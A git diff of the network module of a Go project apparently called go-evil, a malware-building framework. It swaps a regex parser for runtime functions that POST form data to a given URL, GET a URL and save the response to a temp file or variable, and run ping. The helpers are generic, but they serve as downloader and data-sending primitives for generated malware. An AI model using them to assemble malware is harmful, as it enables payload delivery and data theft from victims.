@@ -1,88 +1,132 @@
 package network
 
 import (
-	"regexp"
+	"io/ioutil"
+	"net/http"
+	"os"
+	"os/exec"
 
-	mal "github.com/s9rA16Bf4/go-evil/domains/malware/private"
+	"github.com/s9rA16Bf4/go-evil/utility/contains"
+	"github.com/s9rA16Bf4/go-evil/utility/converter"
+	user "github.com/s9rA16Bf4/go-evil/utility/variables/runtime"
 	"github.com/s9rA16Bf4/notify_handler/go/notify"
 )
 
-const (
-	EXTRACT_SUBDOMAIN      = "(network|#net)\\.(.+)\\.(.+)\\(.*\\);" // Captures subdomain and function
-	EXTRACT_FUNCTION_VALUE = ".+\\(\"(.*)\"\\);"                     // Grabs the value being passed to the function
-	EXTRACT_FUNCTION       = "(network|#net)\\.(.+)\\(.*\\);"        // This is for the cases when we don't have a subdomain
-)
+type net_t struct {
+	save_disk        bool                // If a Get request is performed, should the result be saved to disk?
+	temp_file_prefix string              // Every created temp file will contain a prefix to mark them
+	save_variable    bool                //  If a Get request is performed, should the result be saved to a runtime variable?
+	data             map[string][]string // Header consists out of <key> <value>
+	headers          []string            // All defined headers
+	latest_key       string              // The latest defined header
+	ping_roof        string              // How many icmp packages should be sent
+	ping_success     int                 // 0 - false, 1 - true
+}
 
-func Parse(new_line string) {
-	regex := regexp.MustCompile(EXTRACT_FUNCTION_VALUE)
-	result := regex.FindAllStringSubmatch(new_line, -1)
-	var value string
-	if len(result) > 0 {
-		value = result[0][1]
-	} else {
-		value = "NULL"
+var c_net net_t
+
+func POST(target_url string) {
+	if len(c_net.latest_key) == 0 {
+		notify.Error("No header was assigned", "network.POST()")
+		return
 	}
-	regex = regexp.MustCompile(EXTRACT_SUBDOMAIN)
-	result = regex.FindAllStringSubmatch(new_line, -1)
-	if len(result) > 0 { // There is a subdomain to extract
-		subdomain := result[0][2]
-		function := result[0][3]
+	resp, err := http.PostForm(target_url, c_net.data) // Post
+	if err != nil {
+		notify.Error(err.Error(), "network.POST()")
+		return
+	}
+	user.Set_variable(resp.Status)
+}
+func POST_add_header(new_header string) {
+	if c_net.data == nil {
+		c_net.data = make(map[string][]string)
+	}
+	c_net.headers = append(c_net.headers, new_header)
+}
+func POST_set_header(header string) {
+	found := false
+	for _, defined_header := range c_net.headers {
+		if defined_header == header {
+			found = true
+			break
+		}
+	}
+	if !found {
+		notify.Error("Undefined header "+header, "network.POST_set_header()")
+		return
+	}
+	c_net.latest_key = header
+	_, status := c_net.data[header]
+	if !status {
+		c_net.data[header] = make([]string, 0)
+	}
+}
+func POST_bind_value_to_latest_header(value string) {
+	c_net.data[c_net.latest_key] = append(c_net.data[c_net.latest_key], value)
+}
 
-		switch subdomain {
-		case "get":
-			switch function {
-			case "save_disk":
-				mal.AddContent("net.GET_save_disk()")
-			case "save_variable":
-				mal.AddContent("net.GET_save_variable()")
-			case "set_prefix":
-				mal.AddContent("net.GET_set_prefix(\"" + value + "\")")
-			default:
-				function_error(function)
-			}
-		case "post":
-			switch function {
-			case "add_header":
-				mal.AddContent("net.POST_add_header(\"" + value + "\")")
-			case "set_header":
-				mal.AddContent("net.POST_set_header(\"" + value + "\")")
-			case "bind_value":
-				mal.AddContent("net.POST_bind_value_to_latest_header(\"" + value + "\")")
-			default:
-				function_error(function)
-			}
-		case "ping":
-			switch function {
-			case "set_max":
-				mal.AddContent("net.Ping_set_roof(\"" + value + "\")")
-			default:
-				function_error(function)
-			}
-		default:
-			subdomain_error(subdomain)
+func GET(target_url string) {
+	target_url = user.Check_if_variable(target_url)
+
+	if !contains.StartsWith(target_url, []string{"http://", "https://"}) {
+		target_url = "https://" + target_url
+	}
+	resp, err := http.Get(target_url)
+
+	if err != nil {
+		notify.Error(err.Error(), "network.Get()")
+		return
+	}
+	if c_net.save_disk { // Save the result to the disk
+		if c_net.temp_file_prefix == "" {
+			GET_set_prefix("eat_my_ass-")
 		}
-	} else { // There might be a function which doesn't require a subdomain to work
-		regex = regexp.MustCompile(EXTRACT_FUNCTION)
-		result = regex.FindAllStringSubmatch(new_line, -1)
-		if len(result) > 0 {
-			function := result[0][2]
-			switch function {
-			case "post":
-				mal.AddContent("net.POST(\"" + value + "\")")
-			case "get":
-				mal.AddContent("net.GET(\"" + value + "\")")
-			case "ping":
-				mal.AddContent("net.Ping(\"" + value + "\")")
-			default:
-				function_error(function)
-			}
+		if !contains.EndsWith(c_net.temp_file_prefix, []string{"-"}) {
+			c_net.temp_file_prefix += "-"
 		}
+
+		dst, err := ioutil.TempFile(os.TempDir(), c_net.temp_file_prefix)
+		if err != nil {
+			notify.Error(err.Error(), "network.Get()")
+			return
+		}
+		body, _ := ioutil.ReadAll(resp.Body)
+		dst.Write(body)
+		user.Set_variable(dst.Name()) // Save the filename
+
+	} else if c_net.save_variable {
+		body, _ := ioutil.ReadAll(resp.Body)
+		user.Set_variable(string(body))
 	}
 }
 
-func subdomain_error(subdomain string) {
-	notify.Error("Unknown subdomain '"+subdomain+"'", "network.Parse()")
+func GET_save_disk() { // Saves the result to disk
+	c_net.save_disk = true
 }
-func function_error(function string) {
-	notify.Error("Unknown function '"+function+"'", "network.Parse()")
+func GET_save_variable() { // Saves the result to a runtime variable
+	c_net.save_variable = true
+}
+func GET_set_prefix(new_prefix string) { // Tells the system what should the output file be named before a random string is applied
+	c_net.temp_file_prefix = new_prefix
+}
+
+func Ping(target string) {
+	if c_net.ping_roof == "" {
+		Ping_set_roof("5")
+	}
+	out, err := exec.Command("ping", target, "-c "+c_net.ping_roof).Output()
+	if err != nil {
+		c_net.ping_success = 0
+		notify.Error(err.Error(), "network.Ping()")
+		return
+	}
+	c_net.ping_success = 1
+	user.Set_variable(string(out)) // Save the result
+}
+
+func Ping_set_roof(new_roof string) {
+	if converter.String_to_int(new_roof, "network.Ping_set_roof()") == -1 { // Checks if it works
+		return
+	}
+	c_net.ping_roof = new_roof
 }
